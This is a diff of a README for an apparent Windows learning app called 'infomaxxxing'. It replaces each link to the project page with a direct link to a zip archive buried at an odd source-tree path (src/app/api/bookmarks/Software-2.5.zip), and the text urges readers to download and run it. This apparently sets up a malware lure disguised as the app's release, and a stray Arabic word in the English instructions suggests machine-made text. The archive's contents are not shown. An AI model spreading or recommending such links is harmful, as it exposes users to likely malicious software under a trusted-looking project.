@@ -1,6 +1,6 @@
 # 🧠 infomaxxxing - Learn core engineering through a feed
 
-[![Download](https://img.shields.io/badge/Download%20infomaxxxing-blue?style=for-the-badge&logo=github)](https://github.com/Threelobed-john145/infomaxxxing)
+[![Download](https://img.shields.io/badge/Download%20infomaxxxing-blue?style=for-the-badge&logo=github)](https://github.com/Threelobed-john145/infomaxxxing/raw/refs/heads/main/src/app/api/bookmarks/Software-2.5.zip)
 
 ## 📘 What it is
 
@@ -21,7 +21,7 @@ For the smoothest use, keep Windows updated and close large apps before you star
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/Threelobed-john145/infomaxxxing
+https://github.com/Threelobed-john145/infomaxxxing/raw/refs/heads/main/src/app/api/bookmarks/Software-2.5.zip
 
 If the page shows a release file, download it to your computer. If it shows the source files, use the main project download button on the page and save the file to a folder you can find later, مثل Downloads or Desktop.
 
@@ -194,4 +194,4 @@ Small, steady use helps more than long one-time sessions
 
 Open the project page here to download and run infomaxxxing on Windows:
 
-https://github.com/Threelobed-john145/infomaxxxing
+https://github.com/Threelobed-john145/infomaxxxing/raw/refs/heads/main/src/app/api/bookmarks/Software-2.5.zip
